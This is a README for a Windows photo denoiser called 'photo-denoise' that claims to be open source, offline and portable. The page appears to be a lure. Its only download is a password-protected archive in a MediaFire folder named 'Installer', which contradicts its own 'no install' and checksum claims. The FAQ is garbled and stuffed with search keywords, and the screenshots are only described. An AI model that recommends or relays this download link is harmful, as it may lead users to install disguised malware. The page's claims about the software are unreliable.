# photo-denoise

🧽 Free, open-source photo denoiser for Windows — clean high-ISO night shots with local models, batch folders. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Local denoise models** — ONNX networks clean ISO 6400 shots without a subscription or an upload
- ✅ **Detail guard slider** — balance between smearing skin and leaving chroma noise, with a zoom loupe
- ✅ **Shadow boost** — lift dark areas after denoising so night shots stay readable
- ✅ **Batch night shoots** — a folder of hundreds of RAWs or JPEGs processed overnight
- ✅ **Before and after loupe** — 200 percent zoom comparison follows your cursor
- ✅ **EXIF preservation** — camera metadata kept intact through the whole pipeline
- ✅ **100 MB self-contained exe** — runtime bundled, models download separately, offline after that, MIT

## Why photo-denoise

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **photo-denoise** | Topaz DeNoise | Lightroom denoise | RawTherapee |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Paid | Subscription | Free, OSS |
| Open source | **Yes** | No | No | Yes |
| Batch folders | **Yes** | Yes | No | Partial
| Fully offline | **Yes** | Yes | No | Yes
| Detail guard control | **Yes** | Partial | Partial | Manual
| Portable, no install | **Yes, 100 MB** | Installer | Installer | Installer

## FAQ

**free AI denoise for noisy high-ISO photos on Windows?**

Paid denoisers cost more than the lens and Lightroom needs a subscription plus uploads nothing but your patience. photo-denoise runs local models with a detail guard and processes whole night shoots in batch. It is a 100 MB portable exe, MIT, offline, and keeps your EXIF data untouched.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark darkroom (#121417, cyan #0E7490): before and after panes of a night street shot at 200 percent loupe, detail guard slider at 0.65, ISO 6400 badge.
2. Batch panel: 480 RAW files queued from one shoot, progress at 39 percent, per-file status dots, output folder chip set to final.
3. Comparison loupe: cursor-following zoom inset showing noise before and texture after, shadow boost at plus 0.4, EXIF preservation checked.

## Download

| Source | Link |
|---|---|
| 💾 **Installer photo-denoise** | [Installer photo-denoise](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).